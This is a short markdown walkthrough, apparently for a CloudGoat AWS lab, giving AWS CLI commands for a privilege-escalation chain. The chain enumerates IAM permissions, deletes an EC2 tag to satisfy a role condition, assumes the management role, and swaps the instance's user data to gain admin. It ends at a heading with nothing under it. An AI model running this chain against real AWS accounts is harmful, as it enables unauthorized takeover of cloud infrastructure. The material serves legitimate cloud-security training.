### Enumerate the user and roles we have access to
```
iamactionhunter --collect --profile cg_dev_user
iamactionhunter --config write_actions --account <account_id> --user cg_dev_user
iamactionhunter --config dangerous_iam --account <account_id> --user cg_dev_user
iamactionhunter --config write_actions --account <account_id> --role cg_ec2_management_role
```

### Use the start role to enumerate ec2 instances
```
aws ec2 describe-instances --region us-west-2 --profile cg_dev_user
aws ec2 describe-instances --region us-west-2 --profile cg_dev_user --filter "Name=tag:Name,Values=cg_admin_ec2" 
```



### Delete the tag on the EC2 to satify the permission condition
```
aws ec2 delete-tags --region us-west-2 --profile cg_dev_user --resources <instance_id> --tags Key=Name
```

### Assume the cg_ec2_management_role
```
aws sts assume-role --role-arn arn:aws:iam::<account_id>:role/cg_ec2_management_role --role-session-name blah --profile cg_dev_user
```

### Now use the cg_ec2_management_role to stop the instance
```
aws ec2 stop-instances --region us-west-2 --profile cg_ec2_management_role --instance-ids <instance_id>
```

### Use the cg_ec2_management_role to modify the userdata (https://hackingthe.cloud/aws/exploitation/local-priv-esc-mod-instance-att/)
```
aws ec2 modify-instance-attribute --region us-west-2 --profile cg_ec2_management_role --instance-id <instance_id> --user-data file://userdata.txt
```

### Use the cg_ec2_management_role to start the instance
```
aws ec2 start-instances --region us-west-2 --profile cg_ec2_management_role --instance-ids <instance_id>
```

### Access the EC2 and gain admin privileges